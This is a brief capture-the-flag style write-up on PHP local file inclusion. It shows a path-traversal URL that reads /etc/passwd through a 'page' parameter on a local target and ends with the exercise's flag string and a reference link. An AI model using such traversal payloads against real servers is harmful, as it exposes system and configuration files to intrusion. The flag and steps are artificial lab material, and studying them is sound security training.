# PHP File Inclusion exploit
PHP's include() function can be exploited to view seemingly hidden files, such as configuration files.  
/etc/passwd file stores essential information, which required during login - it stores user account information.

# Local File Inclusion

### Step 1
> * Attack
> 1. trial and error with directory hierarchy
> *  Naviagte to http://0.0.0.0/?page= **included_file**:  
> _Input /etc/passwd -> ../../etc/passwd -> ../../../etc/passwd_  
> _http://0.0.0.0/?page=../../../../../../../etc/passwd_  
**Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0**

* https://null-byte.wonderhowto.com/how-to/exploit-php-file-inclusion-web-apps-0179955/